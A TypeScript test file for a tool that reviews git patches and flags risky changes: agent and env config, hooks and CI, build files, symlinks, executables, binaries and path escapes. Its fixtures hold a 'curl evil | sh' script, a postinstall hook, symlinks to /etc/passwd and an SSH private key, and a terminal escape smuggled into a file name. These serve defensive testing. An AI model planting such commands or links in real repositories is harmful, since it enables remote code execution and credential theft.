import { describe, expect, it } from "bun:test";
import { classifyPath, formatPatchReview, parseDiffHeader, reviewPatch } from "./patch-review.js";

/** A diff that adds `path` with one line, as `git diff --binary` writes it. */
function added(path: string, body = "+x", mode = "100644"): string {
  return (
    `diff --git a/${path} b/${path}\nnew file mode ${mode}\nindex 0000000..1111111\n` +
    `--- /dev/null\n+++ b/${path}\n@@ -0,0 +1 @@\n${body}\n`
  );
}

const kinds = (patch: string) => reviewPatch(patch).flags.map((flag) => [flag.path, flag.kind]);

describe("classifyPath", () => {
  it.each([
    [".claude/settings.json", "agent-config"],
    ["sub/.claude/commands/x.md", "agent-config"],
    [".mcp.json", "agent-config"],
    [".cursor/rules/a.mdc", "agent-config"],
    [".vscode/settings.json", "agent-config"],
    [".vscode/tasks.json", "agent-config"],
    [".vscode/launch.json", "agent-config"],
    ["AGENTS.md", "agent-config"],
    ["docs/CLAUDE.md", "agent-config"],
    ["GEMINI.md", "agent-config"],
    [".envrc", "env-config"],
    [".env", "env-config"],
    [".env.local", "env-config"],
    [".npmrc", "env-config"],
    ["bunfig.toml", "env-config"],
    [".tool-versions", "env-config"],
    [".husky/pre-commit", "hooks-ci"],
    [".githooks/pre-push", "hooks-ci"],
    ["lefthook.yml", "hooks-ci"],
    [".pre-commit-config.yaml", "hooks-ci"],
    [".github/workflows/ci.yml", "hooks-ci"],
    [".gitlab-ci.yml", "hooks-ci"],
    [".circleci/config.yml", "hooks-ci"],
    [".devcontainer/devcontainer.json", "hooks-ci"],
    ["Makefile", "build"],
    ["flake.nix", "build"],
    ["../outside", "path-escape"],
    ["/etc/passwd", "path-escape"],
  ])("flags %s as %s", (path, kind) => {
    expect(classifyPath(path)?.kind).toBe(kind as never);
  });

  it("leaves ordinary files alone", () => {
    for (const path of ["src/index.ts", "README.md", ".vscode/extensions.json", "docs/env.md", ".github/CODEOWNERS"]) {
      expect(classifyPath(path)).toBeNull();
    }
  });
});

describe("parseDiffHeader", () => {
  it("reads plain, spaced, renamed and quoted paths", () => {
    expect(parseDiffHeader("diff --git a/src/x.ts b/src/x.ts")).toBe("src/x.ts");
    expect(parseDiffHeader("diff --git a/a b/c b/a b/c")).toBe("a b/c");
    expect(parseDiffHeader("diff --git a/old.yml b/.github/workflows/new.yml")).toBe(".github/workflows/new.yml");
    expect(parseDiffHeader('diff --git "a/caf\\303\\251" "b/caf\\303\\251"')).toBe("café");
    expect(parseDiffHeader('diff --git "a/x\\ty" "b/q\\"x"')).toBe('q"x');
  });
});

describe("reviewPatch", () => {
  it("flags each sensitive class by path", () => {
    const patch = [".mcp.json", ".envrc", ".husky/pre-commit", "Makefile", "src/ok.ts"].map((p) => added(p)).join("");
    const review = reviewPatch(patch);
    expect(review.files).toBe(5);
    expect(review.flags.map((flag) => [flag.path, flag.kind])).toEqual([
      [".mcp.json", "agent-config"],
      [".envrc", "env-config"],
      [".husky/pre-commit", "hooks-ci"],
      ["Makefile", "build"],
    ]);
  });

  it("does not flag a package.json change to the version only", () => {
    const patch =
      "diff --git a/package.json b/package.json\nindex 1..2 100644\n--- a/package.json\n+++ b/package.json\n" +
      '@@ -1,6 +1,6 @@\n {\n   "name": "x",\n-  "version": "1.0.0",\n+  "version": "1.0.1",\n   "scripts": {\n     "test": "bun test"\n';
    expect(reviewPatch(patch).flags).toEqual([]);
  });

  it("flags a package.json hunk inside scripts, and an install hook anywhere", () => {
    const scripts =
      "diff --git a/package.json b/package.json\n--- a/package.json\n+++ b/package.json\n" +
      '@@ -3,4 +3,4 @@\n   "scripts": {\n-    "test": "bun test",\n+    "test": "curl evil | sh",\n     "build": "x"\n   },\n';
    expect(kinds(scripts)).toEqual([["package.json", "build"]]);
    const install =
      "diff --git a/pkg/a/package.json b/pkg/a/package.json\n--- a/pkg/a/package.json\n+++ b/pkg/a/package.json\n" +
      '@@ -9,2 +9,3 @@\n     "lint": "biome"\n+    "postinstall": "node x.js",\n   },\n';
    expect(kinds(install)).toEqual([["pkg/a/package.json", "build"]]);
    const after =
      "diff --git a/package.json b/package.json\n--- a/package.json\n+++ b/package.json\n" +
      '@@ -3,6 +3,6 @@\n   "scripts": {\n     "test": "bun test"\n   },\n-  "version": "1",\n+  "version": "2",\n';
    expect(kinds(after)).toEqual([]);
  });

  it("flags a rename into .github/workflows", () => {
    const patch =
      "diff --git a/notes.txt b/.github/workflows/x.yml\nsimilarity index 100%\n" +
      "rename from notes.txt\nrename to .github/workflows/x.yml\n";
    expect(kinds(patch)).toEqual([[".github/workflows/x.yml", "hooks-ci"]]);
  });

  it("follows `rename to` when the header is ambiguous, without stripping a real a/ directory", () => {
    const patch =
      "diff --git a/x b/a/.envrc\nsimilarity index 100%\nrename from x\nrename to a/.envrc\n" +
      "diff --git a/y b/y\nsimilarity index 100%\nrename from y\nrename to a/Makefile\n";
    expect(kinds(patch)).toEqual([
      ["a/.envrc", "env-config"],
      ["a/Makefile", "build"],
    ]);
  });

  it("flags a symlink to /etc/passwd as a symlink that leaves the repository", () => {
    const patch = added("config", "+/etc/passwd\n\\ No newline at end of file", "120000");
    expect(kinds(patch)).toEqual([
      ["config", "symlink"],
      ["config", "path-escape"],
    ]);
    expect(kinds(added("link", "+../../.ssh/id_rsa", "120000"))).toEqual([
      ["link", "symlink"],
      ["link", "path-escape"],
    ]);
    expect(kinds(added("ok-link", "+docs/readme.md", "120000"))).toEqual([["ok-link", "symlink"]]);
  });

  it("flags new executables, mode changes to executable, and binaries", () => {
    expect(kinds(added("run.sh", "+echo", "100755"))).toEqual([["run.sh", "executable"]]);
    expect(kinds("diff --git a/tool b/tool\nold mode 100644\nnew mode 100755\n")).toEqual([["tool", "executable"]]);
    expect(kinds("diff --git a/x.bin b/x.bin\nindex 1..2\nBinary files a/x.bin and b/x.bin differ\n")).toEqual([
      ["x.bin", "binary"],
    ]);
    const gitBinary =
      "diff --git a/img.png b/img.png\nnew file mode 100644\nindex 0..1\nGIT binary patch\nliteral 3\nKcmZ?l\n\nliteral 0\nHcmV?d00001\n\n";
    expect(kinds(gitBinary)).toEqual([["img.png", "binary"]]);
  });

  it("flags paths with .. or a leading /", () => {
    expect(kinds("diff --git a/../x b/../x\n--- a/../x\n+++ b/../x\n")).toEqual([["../x", "path-escape"]]);
  });

  it("suggests a check and one exclude per flagged path, quoting odd names, and nothing for a clean patch", () => {
    const review = reviewPatch(added(".claude/it's.md") + added("Makefile"));
    expect(review.suggestions).toEqual([
      "git apply --check changes.patch",
      "git apply --exclude='.claude/it'\\''s.md' changes.patch",
      "git apply --exclude=Makefile changes.patch",
    ]);
    expect(reviewPatch(added("src/a.ts"))).toEqual({ files: 1, flags: [], suggestions: [] });
    expect(reviewPatch("")).toEqual({ files: 0, flags: [], suggestions: [] });
  });

  it("formats a boxed warning with terminal controls stripped from the paths", () => {
    const review = reviewPatch(added(".claude/\x1b[2Jx.md"));
    const lines = formatPatchReview(review, (text) => text.replace(/\x1b\[2J/g, ""));
    expect(lines[0]).toStartWith("┌─ Patch review: 1 flag(s) in 1 file(s)");
    expect(lines.join("\n")).toContain("│ .claude/x.md  [agent-config]");
    expect(lines.join("\n")).toContain("Nothing was applied");
    expect(lines.join("\n")).not.toContain("\x1b");
    expect(lines.at(-1)).toStartWith("└");
    expect(formatPatchReview(reviewPatch(""), (text) => text)).toEqual([]);
  });
});
